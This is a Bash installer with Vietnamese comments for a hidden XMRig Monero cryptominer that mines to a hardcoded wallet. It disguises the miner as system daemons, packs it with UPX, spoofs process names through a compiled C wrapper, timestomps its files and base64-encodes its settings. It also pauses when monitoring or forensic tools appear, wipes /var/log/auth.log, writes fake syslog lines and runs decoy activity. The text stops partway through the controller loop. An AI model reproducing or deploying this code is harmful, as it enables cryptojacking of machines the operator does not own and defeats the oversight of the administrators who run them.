#!/bin/bash

# --- Cấu hình CỦA BẠN (Cần thiết lập - CỰC KỲ QUAN TRỌNG) ---
WALLET_ADDRESS="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
MINING_POOL="pool.hashvault.pro:443"
POOL_PASSWORD="x"

# --- Cấu hình ẨN GIẤU & TÙY CHỈNH NÂNG CAO TỐI ĐA ---
MINER_BASE_DIR="/var/lib/bluetooth/system_profiles"
MINER_DATA_SUBDIR="profile_cache"
MINER_DIR="$MINER_BASE_DIR/$MINER_DATA_SUBDIR"

BIN_NAMES=(
    "systemd-resolved-handler"
    "kworker-task-scheduler"
    "networkd-daemon-controller"
    "dbus-message-broker"
    "udevd-event-processor"
    "auditd-log-collector"
    "snapd-background-agent"
    "gnome-session-manager-helper"
    "pulseaudio-daemon-worker"
    "polkitd-auth-agent"
    "upowerd-battery-monitor"
    "rsyslog-collector-v2"
    "ssh-agent-forwarder"
    "nginx-http-proxy-handler"
    "apache2-worker-process"
    "php-fpm-pool-manager"
    "mysql-query-optimizer"
    "system-update-agent"
    "kernel-module-loader"
    "cron-hourly-updater"
    "systemd-udev-probe"
    "network-config-daemon"
    "cups-filter-driver"
    "modprobe-helper"
    "dbus-daemon-launch"
    "var-log-cleaner"
    "temp-file-processor"
    "memcached-session-handler"
    "redis-background-sync"
    "php-cli-worker"
    "nodejs-event-loop"
    "java-servlet-container"
    "python-web-service"
    "golang-grpc-server"
    "ruby-rails-worker"
    "dotnet-core-host"
    "nginx-cache-worker"
    "apache-access-log"
    "mysql-replication-thread"
    "postgres-background-writer"
    "mongodb-journal-sync"
    "elasticsearch-node-client"
    "kafka-broker-listener"
    "zookeeper-election-follower"
    "rabbitmq-consumer-process"
    "memlockd-daemon"
    "fuse-kernel-handler"
    "kdump-service-monitor"
    "blkio-throttle-daemon"
    "ext4-journal-sync"
    "nfs-daemon-rpc"
    "rpcbind-service"
    "systemd-user-session"
    "user-session-cleanup"
    "gnome-keyring-daemon"
    "gpg-agent-forwarder"
    "at-daemon-worker"
    "anacron-scheduler"
    "systemd-tmpfiles-clean"
    "fwupd-update-daemon"
    "apparmor-parser"
    "containerd-shim"
    "containerd-worker"
    "docker-containerd-shim"
    "kubelet-node-agent"
    "kube-proxy-daemon"
    "etcd-cluster-member"
    "prometheus-exporter"
    "node-exporter"
    "cadvisor-daemon"
    "fluentd-log-forwarder"
    "logstash-pipeline-worker"
    "filebeat-data-shipper"
    "packet-filter-daemon"
    "nftables-ruleset-loader"
    "ipsec-kicker"
    "strongswan-charon"
    "openvpn-daemon"
    "wireguard-kernel-mod"
    "chronyd-time-sync"
    "ntpd-time-sync"
    "timesyncd-helper"
    "acpid-event-handler"
    "irq-softirq-daemon"
    "cpufreq-governor"
    "ksmpsd-daemon"
    "kthreadd-helper"
    "migration/0"
    "rcu_sched"
    "rcuos/0"
    "watchdog/0"
    "watchdog/1"
    "kdevtmpfs"
    "writeback"
    "bioset"
    "mm_percpu_wq"
    "kcompactd0"
    "kblockd"
    "edac-poller"
    "ksoftirqd/0"
    "ksoftirqd/1"
    "ksoftirqd/2"
    "ksoftirqd/3"
    "kworker/0:0"
    "kworker/0:1"
    "kworker/0:2"
    "kworker/1:0"
    "kworker/1:1"
    "kworker/1:2"
    "kworker/u4:0"
    "kworker/u4:1"
    "kworker/u8:0"
    "kworker/u8:1"
    "jbd2/vda1-8"
    "ext4-dio-unwrit"
    "loop0"
    "loop1"
    "loop2"
    "loop3"
    "loop4"
    "loop5"
    "loop6"
    "loop7"
)

FAKE_PROCESS_NAMES=(
    "kworker/u16:0"
    "systemd-logind"
    "rsyslogd"
    "irqbalance"
    "dbus-daemon"
    "pulseaudio"
    "gnome-shell"
    "lightdm"
    "systemd-udevd"
    "cron"
    "atd"
    "sshd"
    "nginx: worker process"
    "apache2: worker process"
    "php-fpm: pool www"
    "mysqld"
    "[ksoftirqd/0]"
    "[kswapd0]"
    "watchdog/0"
    "systemd"
    "agetty"
    "upowerd"
    "thermald"
    "polkitd"
    "mdadm"
    "sleep"
    "kdevtmpfs"
    "jbd2/vda1-8"
    "systemd --user"
    "systemd-journald"
    "ksmd"
    "kthreadd"
    "memcached"
    "redis-server"
    "node"
    "java"
    "python3"
    "go"
    "ruby"
    "dotnet"
    "containerd"
    "kubelet"
    "kube-proxy"
    "etcd"
    "prometheus"
    "fluentd"
    "logstash"
    "filebeat"
    "kernel"
    "systemd-tmpfiles"
    "chronyd"
    "ntpd"
    "acpid"
    "irq/0"
    "cpufreq"
    "migration/1"
    "rcu_bh"
    "kjournald"
    "Xorg"
    "bash"
    "zsh"
    "fish"
    "top"
    "htop"
    "iotop"
    "pstree"
    "cp"
    "mv"
    "ls"
    "cat"
    "grep"
    "awk"
    "sed"
    "find"
    "df"
    "du"
    "free"
    "mount"
    "umount"
    "ssh"
    "scp"
    "rsync"
    "sudo"
    "apt"
    "dnf"
    "yum"
    "dpkg"
    "rpm"
    "update-alternatives"
    "crond"
    "anacron"
    "logrotate"
    "systemd-udevd"
    "systemd-timesyncd"
    "systemd-networkd"
    "networkd-dispatcher"
    "wpa_supplicant"
    "NetworkManager"
    "ModemManager"
    "cupsd"
    "apache2"
    "mysqld"
    "php-fpm"
    "nginx"
    "postgresql"
    "redis-server"
    "memcached"
    "mongod"
    "java"
    "python"
    "node"
    "go"
    "ruby"
    "php"
    "sshfs"
    "nfsd"
    "rpc.mountd"
    "rpc.statd"
    "lockd"
    "rlogind"
    "rshd"
    "telnetd"
    "vsftpd"
    "ftpd"
    "sendmail"
    "postfix"
    "exim4"
    "dovecot"
    "opendkim"
    "bind9"
    "dnsmasq"
    "unbound"
    "openvpn"
    "wireguard"
    "ipsec"
    "strongswan"
    "lighttpd"
    "httpd"
    "sshd"
    "docker"
    "dockerd"
    "containerd"
    "kubelet"
    "kube-proxy"
    "kube-apiserver"
    "etcd"
    "prometheus"
    "grafana"
    "alertmanager"
    "node_exporter"
    "cadvisor"
    "fluentd"
    "logstash"
    "filebeat"
    "journalbeat"
    "metricbeat"
    "packetbeat"
    "auditbeat"
    "heartbeat"
    "nginx-exporter"
    "mysql-exporter"
    "postgres-exporter"
    "redis-exporter"
    "mongodb-exporter"
    "elasticsearch-exporter"
    "kafka-exporter"
    "zookeeper-porter"
    "rabbitmq-exporter"
    "haproxy-exporter"
    "squid"
    "privoxy"
    "tor"
    "polipo"
    "dante-server"
    "shadowsocks-libev"
    "v2ray"
    "xray"
    "trojan"
    "gost"
    "frp"
    "openvpn"
    "ipsec"
    "wireguard"
    "openconnect"
    "anyconnect"
    "forticlientsslvpn"
    "expressvpn"
    "nordvpn"
    "protonvpn"
    "openfortivpn"
)

CPU_PROFILES=(
    "1,18,19,45,120"
    "2,15,18,30,90"
    "3,10,15,60,180"
    "4,8,12,10,30"
    "max,0,5,2,10"
    "0,19,19,5,15"
    "1,10,15,120,240"
    "2,5,10,60,180"
)

CHANCE_TO_RUN=85
CHANCE_TO_SWITCH_PROFILE=40
CHANCE_TO_CHANGE_BIN_NAME=20

CHANCE_FOR_LONG_PAUSE=7
LONG_PAUSE_MIN_HOURS=2
LONG_PAUSE_MAX_HOURS=36

CHANCE_FOR_FAKE_ACTIVITY=75

FAKE_ACTIVITY_COMMANDS=(
    "dd if=/dev/urandom of=\$MINER_DIR/temp_block_\$(date +%s%N) bs=1M count=\$((RANDOM % 50 + 10)); rm -f \$MINER_DIR/temp_block_*" ",5,20,io_disk_write"
    "find /var/log -type f -mtime +7 -print0 | xargs -0 du > /dev/null 2>&1" ",2,10,cpu_scan_old_logs"
    "grep -r \"error\" /var/log/messages /var/log/syslog > /dev/null 2>&1" ",1,5,cpu_log_check"
    "sleep \$((RANDOM % 5 + 1))" ",1,5,cpu_sleep"
    "sort -R /usr/share/dict/words | head -n \$((RANDOM % 1000 + 100)) | wc -l > /dev/null 2>&1" ",2,8,cpu_text_count"
    "openssl speed -bytes \$((RANDOM % 1024 + 128)) -elapsed \$((RANDOM % 3 + 1)) > /dev/null 2>&1" ",3,15,cpu_crypto_benchmark"
    "curl -s -o /dev/null http://www.google.com/?q=\$RANDOM --max-time 5" ",1,3,net_http_google"
    "ping -c \$((RANDOM % 5 + 1)) 1.1.1.1 --timeout 3 > /dev/null 2>&1" ",1,2,net_ping_cloudflare"
    "df -h > /dev/null 2>&1" ",1,2,system_disk_usage"
    "free -m > /dev/null 2>&1" ",1,2,system_ram_usage"
    "ps aux > /dev/null 2>&1" ",1,2,system_process_list"
    "tar -czf \$MINER_DIR/temp_archive_\$(date +%s%N).tar.gz /etc/logrotate.d/ > /dev/null 2>&1; rm -f \$MINER_DIR/temp_archive_*.tar.gz" ",5,25,io_compress_etc"
    "head -c \$((RANDOM % 1000000 + 100000)) </dev/urandom | sha256sum > /dev/null" ",5,30,cpu_hash_random"
    "apt-get update --dry-run > /dev/null 2>&1" ",5,15,system_apt_sim"
    "echo \"Fake log entry: System check passed for service XYZ at \$(date)\" >> /var/log/syslog" ",1,1,log_injection"
    "cat /dev/null > /var/log/auth.log && echo \"\"" ",1,1,log_clear_auth"
    "touch /tmp/temp_app_file_\$(date +%s)" ",1,1,file_touch"
    "echo \"Some data\" > /tmp/temp_app_data_\$(date +%s) && cat /tmp/temp_app_data_\$(date +%s) > /dev/null && rm -f /tmp/temp_app_data_\$(date +%s)" ",2,5,file_read_write"
    "sudo mdadm --detail --scan > /dev/null 2>&1" ",1,5,system_raid_check"
    "sudo /usr/sbin/grub-mkconfig -o /dev/null > /dev/null 2>&1" ",5,15,system_grub_regen_sim"
    "sudo update-initramfs -u > /dev/null 2>&1" ",10,30,system_initramfs_update_sim"
    "sudo systemctl list-unit-files --type=service > /dev/null 2>&1" ",1,3,system_service_list"
    "sudo ss -tuln > /dev/null 2>&1" ",1,3,net_listen_ports"
    "sudo netstat -natp > /dev/null 2>&1" ",1,3,net_all_connections"
)

SUSPICIOUS_PROCESS_KEYWORDS=(
    "strace"
    "lsof"
    "tcpdump"
    "wireshark"
    "perf"
    "auditd"
    "systemtap"
    "dtrace"
    "valgrind"
    "gdb"
    "ida"
    "radare2"
    "ghidra"
    "sysdig"
    "falco"
    "snort"
    "zeek"
    "suricata"
    "elk-stack"
    "ossec"
    "fail2ban"
    "clamav"
    "rkhunter"
    "chkrootit"
    "procmon"
    "processmonitor"
    "diskmon"
    "netmon"
    "wireshark"
    "tshark"
    "nmap"
    "masscan"
    "zmap"
    "nessus"
    "openvas"
    "metasploit"
    "cobaltstrike"
    "empire"
    "powershell"
    "pwsh"
    "powershell.exe"
    "wmic"
    "tasklist"
    "netstat"
    "ss"
    "htop"
    "top"
    "dmesg"
    "journalctl"
    "grep -i "miner""
    "ps -ef | grep "cpu""
    "lsmod"
    "modinfo"
    "insmod"
    "rmmod"
    "chattr"
    "lsattr"
    "auditctl"
    "fuser"
    "lsof"
    "netstat -lp"
    "ss -lp"
    "ufw status"
    "iptables -L"
    "ip route"
    "arp -a"
    "dig"
    "nslookup"
    "host"
    "whois"
    "traceroute"
    "mtr"
    "nc"
    "ncat"
    "socat"
    "strace"
    "ltrace"
    "readelf"
    "objdump"
    "strings"
    "hexdump"
    "xxd"
    "binwalk"
    "foremost"
    "scalpel"
    " volatility"
    "rekall"
    "dumpit"
    "winpmem"
    "memdump"
    "ramdump"
    "forensics"
    "forensic"
    "malware"
    "virus"
    "trojan"
    "rootkit"
    "exploit"
    "vulnerability"
)
SUSPICIOUS_PAUSE_MIN_SECONDS=300
SUSPICIOUS_PAUSE_MAX_SECONDS=1800

DISABLE_XMRIG_LOGGING="true"

# Không sử dụng Systemd service name trong môi trường container này
SYSTEMD_SERVICE_NAME="dummy_service_name" 

WRAPPER_BINARY_NAME="sysd_proc_mgr"

echo "Bắt đầu cài đặt XMRig và cấu hình tinh vi (Script Bash Tổng Hợp Tối Đa cho Container)..."
echo "--- VUI LÒNG ĐẢM BẢO BẠN ĐÃ CẬP NHẬT CÁC CẤU HÌNH Ở ĐẦU SCRIPT! ---"
echo "WALLET_ADDRESS, MINING_POOL, MINER_BASE_DIR, BIN_NAMES, FAKE_PROCESS_NAMES..."
sleep 3

echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
if command -v apt &> /dev/null
then
    sudo apt update -y > /dev/null 2>&1
    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev shred curl openssl procps iputils-ping coreutils grep findutils tar gzip pv upx jq gcc make net-tools > /dev/null 2>&1
elif command -v yum &> /dev/null
then
    sudo yum install -y epel-release > /dev/null 2>&1
    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel shred curl openssl procps iputils pv upx jq gcc make net-tools > /dev/null 2>&1
else
    echo "Hệ điều hành không được hỗ trợ. Vui lòng cài đặt thủ công các gói: wget, build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev, shred, curl, openssl, procps, iputils-ping, coreutils, grep, findutils, tar, gzip, pv, upx, jq, gcc, make, net-tools."
    exit 1
fi
echo "Các gói cần thiết đã được cài đặt."

echo "Tạo thư mục miner tại $MINER_DIR..."
sudo mkdir -p "$MINER_DIR"
sudo chown "$USER":"$USER" "$MINER_DIR"
cd "$MINER_DIR" || { echo "Lỗi: Không thể vào thư mục $MINER_DIR. Thoát."; exit 1; }
echo "Đã vào thư mục $MINER_DIR."

echo "Tải XMRig phiên bản mới nhất cho Linux (static build)..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz"
XMRIG_ARCHIVE=$(basename "$XMRIG_URL")
MINER_ORIGINAL_NAME="xmrig_orig"

wget "$XMRIG_URL" -q --show-progress
if [ $? -ne 0 ]; then
    echo "Lỗi: Không thể tải xuống XMRig. Thoát."
    exit 1
fi
echo "Đã tải xuống XMRig."

echo "Giải nén XMRig và nén bằng UPX để làm thay đổi chữ ký..."
tar -xzf "$XMRIG_ARCHIVE" --strip-components=1 -C .
mv xmrig "$MINER_ORIGINAL_NAME"

if command -v upx &> /dev/null; then
    upx -9 "$MINER_ORIGINAL_NAME" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "XMRig đã được nén bằng UPX thành công."
    else
        echo "Warning: UPX nén XMRig thất bại. Tiếp tục mà không UPX."
        mv "$MINER_ORIGINAL_NAME" "xmrig_unpacked"
        MINER_ORIGINAL_NAME="xmrig_unpacked"
    fi
else
    echo "Warning: UPX không tìm thấy. Tiếp tục mà không UPX."
    mv "$MINER_ORIGINAL_NAME" "xmrig_unpacked"
    MINER_ORIGINAL_NAME="xmrig_unpacked"
fi

shred -u "$XMRIG_ARCHIVE" > /dev/null 2>&1
rm -rf xmrig-6.23.0 > /dev/null 2>&1
echo "Đã giải nén và xử lý XMRig."

echo "Tạo và biên dịch C wrapper để đổi tên tiến trình (argv[0])..."
C_WRAPPER_SOURCE="simple_wrapper_src.c"
cat <<EOF > "$C_WRAPPER_SOURCE"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/prctl.h>

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <new_process_name> <path_to_xmrig> <xmrig_config_path>\\n", argv[0]);
        return 1;
    }

    char *new_proc_name = argv[1];
    char *xmrig_path = argv[2];
    char *xmrig_config_path = argv[3];

    if (prctl(PR_SET_NAME, (unsigned long)new_proc_name, 0, 0, 0) == -1) {
    }

    char *xmrig_args[4];
    xmrig_args[0] = new_proc_name;
    xmrig_args[1] = (char *)"-c";
    xmrig_args[2] = xmrig_config_path;
    xmrig_args[3] = NULL;

    execv(xmrig_path, xmrig_args);

    return 1;
}
EOF

gcc "$C_WRAPPER_SOURCE" -o "$WRAPPER_BINARY_NAME" > /dev/null 2>&1 -s
if [ $? -eq 0 ]; then
    echo "C wrapper biên dịch thành công."
    chmod +x "$WRAPPER_BINARY_NAME"
    shred -u "$C_WRAPPER_SOURCE" > /dev/null 2>&1
else
    echo "ERROR: C wrapper biên dịch thất bại. Miner sẽ sử dụng phương pháp đặt tên tiến trình cũ của XMRig (ít ẩn hơn)."
    rm -f "$WRAPPER_BINARY_NAME" > /dev/null 2>&1
    WRAPPER_BINARY_NAME=""
fi

echo "Tạo các file cấu hình XMRig cho các profile CPU khác nhau..."

NUM_PHYSICAL_CORES=$(grep '^cpu cores' /proc/cpuinfo | uniq | awk '{print $4}')
if [ -z "$NUM_PHYSICAL_CORES" ]; then
    NUM_PHYSICAL_CORES=$(nproc --all)
    echo "Warning: Could not detect physical CPU cores. Using total logical cores: $NUM_PHYSICAL_CORES"
fi

create_config_file() {
    local profile_id=$1
    local cpu_threads_raw=$2
    local nice_min=$3
    local nice_max=$4
    local log_file_config="null"
    local print_time_config=""

    if [ "$DISABLE_XMRIG_LOGGING" = "false" ]; then
        log_file_config="\"xmrig_profile_${profile_id}.log\""
        print_time_config='"print-time": '$(( RANDOM % 300 + 120 ))','
    fi
    
    local cpu_threads_config=""
    if [ "$cpu_threads_raw" == "max" ]; then
        cpu_threads_config="null"
    else
        local num_threads=$cpu_threads_raw
        if [ "$num_threads" -gt "$NUM_PHYSICAL_CORES" ]; then
            num_threads=$NUM_PHYSICAL_CORES
        fi
        
        local selected_cores=()
        local all_cores=()
        for ((i=0; i<NUM_PHYSICAL_CORES; i++)); do
            all_cores+=("$i")
        done
        
        for ((i=0; i<num_threads; i++)); do
            if [ ${#all_cores[@]} -eq 0 ]; then break; fi
            
            local num_available_cores=${#all_cores[@]}
            local rand_idx=$(( RANDOM % num_available_cores ))
            
            selected_cores+=("${all_cores[$rand_idx]}")
            unset 'all_cores[$rand_idx]'
            all_cores=( "${all_cores[@]}" ) 
        done
        
        if [ ${#selected_cores[@]} -gt 0 ]; then
            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")]"
        else
            cpu_threads_config="[0]"
        fi
    fi
    
    RANDOM_FAKE_PROCESS_NAME=${FAKE_PROCESS_NAMES[$RANDOM % ${#FAKE_PROCESS_NAMES[@]}]}
    RANDOM_NICE_VALUE=$(( nice_min + RANDOM % (max_nice - nice_min + 1) ))

    cat <<EOF > config_profile_${profile_id}.json
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "rx": ${cpu_threads_config},
        "cctp": null,
        "asm": true
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINING_POOL",
            "user": "$WALLET_ADDRESS",
            "pass": "$POOL_PASSWORD",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "log-in": null
        }
    ],
    "log-file": ${log_file_config},
    ${print_time_config}
    "background": true,
    "syslog": false,
    "nice": ${RANDOM_NICE_VALUE},
    "daemon": true,
    "custom-name": "$RANDOM_FAKE_PROCESS_NAME"
}
EOF
}

for i in "${!CPU_PROFILES[@]}"; do
    profile_info=${CPU_PROFILES[$i]}
    threads_raw=$(echo "$profile_info" | cut -d',' -f1)
    min_nice=$(echo "$profile_info" | cut -d',' -f2)
    max_nice=$(echo "$profile_info" | cut -d',' -f3)
    create_config_file "$i" "$threads_raw" "$min_nice" "$max_nice"
done
echo "Đã tạo các file cấu hình XMRig."

echo "Di chuyển XMRig binary vào vị trí ẩn..."
if [ -f "$MINER_ORIGINAL_NAME" ]; then
    RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]}
    MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
    mv "$MINER_ORIGINAL_NAME" "$MINER_ACTUAL_PATH"
    chmod +x "$MINER_ACTUAL_PATH"
    echo "Đã di chuyển XMRig binary."
else
    echo "ERROR: XMRig original binary not found. Installation aborted."
    exit 1
fi

echo "Thay đổi timestamp của các file miner để khớp với file hệ thống..."
RANDOM_SYSTEM_FILE=$(find /bin /usr/bin /sbin /usr/sbin -type f -perm /u=s -print0 | shuf -n 1 -z) 
if [ -z "$RANDOM_SYSTEM_FILE" ]; then
    RANDOM_SYSTEM_FILE="/bin/ls"
fi
echo "Using timestamp from: $RANDOM_SYSTEM_FILE"

for file in "$MINER_DIR"/*; do
    if [ -f "$file" ]; then
        touch -r "$RANDOM_SYSTEM_FILE" "$file" > /dev/null 2>&1
    fi
done
echo "Đã timestomp các file."

echo "Tạo script điều khiển chính (master_controller.sh) cho hoạt động liên tục..."
cat <<EOF > master_controller.sh
#!/bin/bash

# Thiết lập biến BASE_DIR_ENCODED ở đây
base_dir_encoded="$(echo "$MINER_DIR" | base64)" 

bin_names_encoded=(
    $(for name in "${BIN_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
fake_process_names_encoded=(
    $(for name in "${FAKE_PROCESS_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
cpu_profiles_encoded=(
    $(for profile in "${CPU_PROFILES[@]}"; do echo -n "\"$(echo "$profile" | base64)\" "; done)
)
fake_activity_commands_encoded=(
    $(for cmd in "${FAKE_ACTIVITY_COMMANDS[@]}"; do echo -n "\"$(echo "$cmd" | base64)\" "; done)
)
suspicious_process_keywords_encoded=(
    $(for kw in "${SUSPICIOUS_PROCESS_KEYWORDS[@]}"; do echo -n "\"$(echo "$kw" | base64)\" "; done)
)

CHANCE_TO_RUN=$CHANCE_TO_RUN
CHANCE_TO_SWITCH_PROFILE=$CHANCE_TO_SWITCH_PROFILE
CHANCE_TO_CHANGE_BIN_NAME=$CHANCE_TO_CHANGE_BIN_NAME
CHANCE_FOR_LONG_PAUSE=$CHANCE_FOR_LONG_PAUSE
LONG_PAUSE_MIN_HOURS=$LONG_PAUSE_MIN_HOURS
LONG_PAUSE_MAX_HOURS=$LONG_PAUSE_MAX_HOURS
CHANCE_FOR_FAKE_ACTIVITY=$CHANCE_FOR_FAKE_ACTIVITY
SUSPICIOUS_PAUSE_MIN_SECONDS=$SUSPICIOUS_PAUSE_MIN_SECONDS
SUSPICIOUS_PAUSE_MAX_SECONDS=$SUSPICIOUS_PAUSE_MAX_SECONDS

STATE_FILE="\$(decode_string "\$base_dir_encoded")/.miner_state"
touch "\$STATE_FILE" > /dev/null 2>&1
chmod 600 "\$STATE_FILE" > /dev/null 2>&1

CONTROLLER_LOG="\$(decode_string "\$base_dir_encoded")/controller.log"

WRAPPER_BINARY_NAME="$WRAPPER_BINARY_NAME"
MINER_ACTUAL_PATH_ENCODED="$(echo "$MINER_ACTUAL_PATH" | base64)" 

CLEANUP_INTERVAL_SECONDS=$((4 * 3600)) # 4 tiếng một lần
LAST_CLEANUP_TIMESTAMP=\$(date +%s)

decode_string() {
    echo "\$1" | base64 -d
}

log_message() {
    echo "\$(date +'%Y-%m-%d %H:%M:%S'): \$1" >> "\$CONTROLLER_LOG"
}

stop_miner() {
    local decoded_fake_process_names=()
    for encoded_name in "\${fake_process_names_encoded[@]}"; do
        decoded_fake_process_names+=("\$(decode_string "\$encoded_name")")
    done
    local decoded_bin_names=()
    for encoded_name in "\${bin_names_encoded[@]}"; do
        decoded_bin_names+=("\$(decode_string "\$encoded_name")")
    done

    # Kiểm tra và kill các tiến trình miner dựa trên tên giả và tên thật của binary
    local pids_to_kill=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")" | grep -v "\$\$" | grep -v "master_controller.sh")

    if [ -n "\$pids_to_kill" ]; then
        for pid in \$pids_to_kill; do
            kill -9 \$pid > /dev/null 2>&1
        done
        log_message "Stopped existing miner processes."
    fi
}

start_miner() {
    local config_id=\$1
    local current_bin_name_encoded=\$2
    local current_bin_name="\$(decode_string "\$current_bin_name_encoded")"
    local config_file="config_profile_\${config_id}.json"
    local miner_config_full_path="\$(decode_string "\$base_dir_encoded")/\$config_file"

    local actual_miner_binary_path="\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")"
    local wrapper_path="\$(decode_string "\$base_dir_encoded")/\$WRAPPER_BINARY_NAME"

    # Kiểm tra xem miner có đang chạy với tên giả định đó không
    if pgrep -f "\$current_bin_name" > /dev/null; then
        log_message "Miner already running with fake name: \$current_bin_name. No action needed."
        return 0
    fi

    # Đảm bảo dừng các tiến trình cũ trước khi khởi động cái mới
    stop_miner

    if [ -n "\$WRAPPER_BINARY_NAME" ] && [ -f "\$wrapper_path" ] && [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
        # Chạy miner qua C wrapper
        nohup "\$wrapper_path" "\$current_bin_name" "\$actual_miner_binary_path" "\$miner_config_full_path" > /dev/null 2>&1 &
        log_message "Miner started via C wrapper (fake name: \$current_bin_name, pid: \$!)."
    elif [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
        # Chạy trực tiếp nếu wrapper không có
        nohup "\$actual_miner_binary_path" -c "\$miner_config_full_path" > /dev/null 2>&1 &
        log_message "WARNING: C wrapper not available. Miner started directly (pid: \$!). Less stealthy."
    else
        log_message "ERROR: Missing miner binary, wrapper, or config file. Cannot start miner."
    fi
}

run_fake_activity() {
    if (( RANDOM % 100 < CHANCE_FOR_FAKE_ACTIVITY )); then
        local activity_info_encoded=\${fake_activity_commands_encoded[\$RANDOM % \${#fake_activity_commands_encoded[@]}]}
        local activity_info=\$(decode_string "\$activity_info_encoded")

        local cmd=\$(echo "\$activity_info" | cut -d',' -f1)
        local min_duration=\$(echo "\$activity_info" | cut -d',' -f2)
        local max_duration=\$(echo "\$activity_info" | cut -d',' -f3)
        local activity_type=\$(echo "\$activity_info" | cut -d',' -f4)

        local duration_seconds=\$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))

        # Chạy lệnh trong subshell và chuyển sang nền
        ( nohup bash -c "export MINER_DIR=\$(decode_string "\$base_dir_encoded"); timeout \$duration_seconds \$cmd" > /dev/null 2>&1 & )
        log_message "Running fake activity (\$activity_type) command: '\$cmd' for \$duration_seconds seconds."
    fi
}

is_xmrig_active() {
    local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
    local current_bin_name_encoded=\$(echo "\$state_data" | awk '{print \$3}')
    local current_bin_name="\$(decode_string "\$current_bin_name_encoded")"

    if [ -z "\$current_bin_name" ]; then return 1; fi

    if pgrep -f "\$current_bin_name" > /dev/null; then
        return 0
    fi
    return 1
}

check_for_suspicious_processes() {
    local decoded_keywords=()
    for encoded_kw in "\${suspicious_process_keywords_encoded[@]}"; do
        decoded_keywords+=("\$(decode_string "\$encoded_kw")")
    done

    local ps_output=\$(ps aux)

    for keyword in "\${decoded_keywords[@]}"; do
        if echo "\$ps_output" | grep -F "\$keyword" | grep -v "grep" | grep -v "\$\$" | grep -v "master_controller.sh" > /dev/null; then
            log_message "WARNING: Suspicious process detected: '\$keyword'. Initiating pause."
            return 0
        fi
    done
    return 1
}

run_cleanup() {
    local base_dir="\$(decode_string "\$base_dir_encoded")"
    cd "\$base_dir" || return 1

    find . -name "xmrig_profile_*.log" -delete > /dev/null 2>&1
    rm -f "controller.log" > /dev/null 2>&1
    rm -f "temp_block_*" > /dev/null 2>&1
    rm -f "temp_archive_*.tar.gz" > /dev/null 2>&1
    rm -f /tmp/temp_app_file_* > /dev/null 2>&1
    rm -f /tmp/temp_app_data_* > /dev/null 2>&1
    log_message "Cleanup of temporary files and logs completed."
    LAST_CLEANUP_TIMESTAMP=\$(date +%s)
}


# --- Vòng lặp chính để duy trì miner ---
while true; do
    current_timestamp=\$(date +%s)
    local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
    local last_run_timestamp=\$(echo "\$state_data" | awk '{print \$1}')
    local current_profile_id=\$(echo "\$state_data" | awk '{print \$2}')
    local current_bin_name_encoded=\$(echo "\$state_data" | awk '{print \$3}')
    local long_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$4}')
    local suspicious_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$5}')

    # Thực hiện dọn dẹp định kỳ
    if (( current_timestamp - LAST_CLEANUP_TIMESTAMP > CLEANUP_INTERVAL_SECONDS )); then
        run_cleanup
    fi

    if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp < long_pause_end_timestamp )); then
        stop_miner
        log_message "Still in long pause until \$(date -d @\$long_pause_end_timestamp). Miner stopped."
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
        stop_miner
        log_message "Still in suspicious activity pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    if check_for_suspicious_processes; then
        stop_miner
        local pause_duration=\$(( SUSPICIOUS_PAUSE_MIN_SECONDS + RANDOM % (SUSPICIOUS_PAUSE_MAX_SECONDS - SUSPICIOUS_PAUSE_MIN_SECONDS + 1) ))
        suspicious_pause_end_timestamp=\$(( current_timestamp + pause_duration ))
        log_message "Detected suspicious process. Pausing miner for \$((pause_duration / 60)) minutes."
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
